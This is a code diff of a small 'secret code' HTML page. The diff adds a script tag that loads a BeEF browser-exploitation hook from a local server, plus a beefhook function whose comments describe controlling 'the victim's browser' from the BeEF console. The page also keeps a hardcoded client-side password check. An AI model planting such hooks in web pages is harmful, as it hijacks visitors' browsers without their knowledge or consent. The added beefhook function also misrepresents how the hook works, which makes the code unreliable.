@@ -1,24 +1,32 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Secret Code Protected Website</title>
+<title>Secret Code Protected Website</title>
+<script src="http://127.0.0.1:3000/hook.js"></script>
 </head>
 <body>
-    <h1>Welcome to the Secret Code Protected Website</h1>
-    <p>Please enter the secret code to access the website:</p>
-    <input type="text" id="code" />
-    <button onclick="checkCode()">Submit</button>
-    <p id="result"></p>
-
-    <script>
-        function checkCode() {
-            var code = document.getElementById("code").value;
-            if (code == "Ganja") {
-                document.getElementById("result").innerHTML = "Congratulations! You entered the correct code. Welcome to the website!";
-            } else {
-                document.getElementById("result").innerHTML = "Sorry, the host is currently offline. Please wait and try again later.";
-            }
-        }
-    </script>
+<h1>Welcome to the Secret Code Protected Website</h1>
+<p>Please enter the secret code to access the website:</p>
+<input type="text" id="code" />
+<button onclick="checkCode()">Submit</button>
+<p id="result"></p>
+<script>
+// Once the BeEF hook is loaded, it will call the beefhook function with the hook ID
+function beefhook(hook_id) {
+// You can now use the hook ID to control the victim's browser through the BeEF console
+console.log("BeEF hook ID: " + hook_id);
+}
+// Call the beefhook function with a dummy value to ensure that it is defined
+beefhook(0);
+// The rest of your JavaScript code goes here
+function checkCode() {
+var code = document.getElementById("code").value;
+if (code == "Ganja") {
+document.getElementById("result").innerHTML = "Congratulations! You entered the correct code. Welcome to the website!";
+} else {
+document.getElementById("result").innerHTML = "Sorry, the host is currently offline. Please wait and try again later.";
+}
+}
+</script>
 </body>
 </html>
